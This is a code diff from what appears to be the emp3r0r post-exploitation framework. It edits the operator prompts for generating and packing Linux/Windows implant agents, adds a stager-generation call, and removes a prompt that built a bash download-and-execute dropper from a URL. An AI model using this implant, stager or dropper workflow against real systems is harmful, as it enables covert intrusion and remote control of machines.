@@ -31,7 +31,7 @@ func GenAgent() {
 		EmpWorkSpace,
 		now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second())
 
-	os_choice := CliAsk("Generate agent for (1) Linux, (2) Windows: ")
+	os_choice := CliAsk("Generate agent for (1) Linux, (2) Windows: ", false)
 	is_win := os_choice == "2"
 	is_linux := os_choice == "1"
 	if is_linux {
@@ -115,6 +115,8 @@ func GenAgent() {
 	if err != nil {
 		CliPrintError("Failed to save final agent binary: %v", err)
 	}
+
+	GenStager(packed_file)
 }
 
 // PackAgentBinary pack agent ELF binary with Packer()
@@ -126,7 +128,7 @@ func PackAgentBinary() {
 	defer CliCompleter.SetChildren(CmdCompls)
 
 	// ask
-	answ := CliAsk("Path to agent binary: ")
+	answ := CliAsk("Path to agent binary: ", false)
 
 	go func() {
 		err := Packer(answ)
@@ -198,7 +200,7 @@ func PromptForConfig(isAgent bool) (err error) {
 		}
 
 		// ask
-		return CliAsk(fmt.Sprintf("%s (%s): ", prompt, config_key))
+		return CliAsk(fmt.Sprintf("%s (%s): ", prompt, config_key), false)
 	}
 
 	// ask a few questions
@@ -289,13 +291,6 @@ func PromptForConfig(isAgent bool) (err error) {
 		RuntimeConfig.BroadcastIntervalMax = 0
 	} else {
 		RuntimeConfig.BroadcastIntervalMax = 120
-	}
-
-	// ask for URL to download/exec agent
-	if CliYesNo("Generate bash dropper command?") {
-		url := CliAsk("(HTTP) URL to download agent binary (or staged executables), eg. 'http://example.com/emp3r0r': ")
-		dropper := bash_http_downloader(url)
-		CliPrintInfo("Your dropper command is\n%s", dropper)
 	}
 
 	// save emp3r0r.json
